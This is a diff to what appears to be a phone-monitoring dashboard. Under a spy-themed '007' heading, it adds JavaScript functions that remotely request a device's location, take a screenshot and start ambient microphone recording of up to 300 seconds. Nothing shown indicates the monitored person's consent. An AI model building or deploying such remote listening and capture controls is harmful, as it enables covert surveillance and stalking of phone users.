@@ -1175,6 +1175,81 @@ function fillDeviceFilters(){
   });
 }
 
+// ─── COMMANDES À DISTANCE (Style 007) ───
+
+// Demander la localisation immédiate
+async function requestLocation(){
+  if(!currentDetailDevice){alert('Sélectionnez un appareil');return;}
+  const btn=document.getElementById('btn-locate-now');
+  btn.textContent='📍 Localisation…';
+  try{
+    const r=await fetch(`${API}/api/commands/${currentDetailDevice}`,{
+      method:'POST',headers:authHeaders(),
+      body:JSON.stringify({type:'get_location',payload:{priority:'high'}})
+    });
+    const d=await r.json();
+    if(d.ok){
+      showNotification('location','Commande envoyée','Localisation demandée à '+deviceName(currentDetailDevice),currentDetailDevice,()=>showPage('map'));
+      setTimeout(()=>{btn.textContent='📍 Localiser';},3000);
+    }else{
+      btn.textContent='📍 Localiser';
+      alert('Erreur : '+(d.error||'inconnue'));
+    }
+  }catch(err){
+    btn.textContent='📍 Localiser';
+    alert('Erreur réseau');
+  }
+}
+
+// Demander une capture d'écran
+async function requestScreenshot(){
+  if(!currentDetailDevice){alert('Sélectionnez un appareil');return;}
+  const btn=document.getElementById('btn-take-screenshot');
+  btn.textContent='🖥️ Capture…';
+  try{
+    const r=await fetch(`${API}/api/commands/${currentDetailDevice}/screenshot`,{
+      method:'POST',headers:authHeaders()
+    });
+    const d=await r.json();
+    if(d.ok){
+      showNotification('photo','Commande envoyée','Capture d\'écran demandée à '+deviceName(currentDetailDevice),currentDetailDevice,null);
+      setTimeout(()=>{btn.textContent='🖥️ Capture écran';},3000);
+    }else{
+      btn.textContent='🖥️ Capture écran';
+      alert('Erreur : '+(d.error||'inconnue'));
+    }
+  }catch(err){
+    btn.textContent='🖥️ Capture écran';
+    alert('Erreur réseau');
+  }
+}
+
+// Demander l'écoute ambiante
+async function requestListen(){
+  if(!currentDetailDevice){alert('Sélectionnez un appareil');return;}
+  const duration = prompt('Durée d\'écoute (secondes, max 300):', '60');
+  if(!duration) return;
+  const btn=document.getElementById('btn-listen');
+  btn.textContent='🎤 Écoute…';
+  try{
+    const r=await fetch(`${API}/api/commands/${currentDetailDevice}/listen`,{
+      method:'POST',headers:authHeaders(),
+      body:JSON.stringify({duration:parseInt(duration)||60,mode:'ambient'})
+    });
+    const d=await r.json();
+    if(d.ok){
+      showNotification('call','Écoute activée',`Enregistrement de ${duration}s sur `+deviceName(currentDetailDevice),currentDetailDevice,null);
+      setTimeout(()=>{btn.textContent='🎤 Écouter';},parseInt(duration)*1000+3000);
+    }else{
+      btn.textContent='🎤 Écouter';
+      alert('Erreur : '+(d.error||'inconnue'));
+    }
+  }catch(err){
+    btn.textContent='🎤 Écouter';
+    alert('Erreur réseau');
+  }
+}
+
 // ─── PHOTOS ───
 
 // Demander au téléphone de prendre une photo
